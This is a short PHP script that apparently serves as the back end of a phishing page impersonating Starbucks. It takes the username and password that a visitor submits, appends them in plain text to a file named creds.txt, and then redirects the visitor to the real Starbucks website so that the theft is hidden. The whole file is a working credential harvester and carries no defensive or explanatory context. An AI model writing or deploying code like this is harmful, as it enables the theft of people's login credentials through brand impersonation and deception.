<?php
// Open the file to append credentials
$file = fopen("creds.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n");
fclose($file);

// Redirect to the real Starbucks website
header("Location: https://www.starbucks.com");
exit();
?>
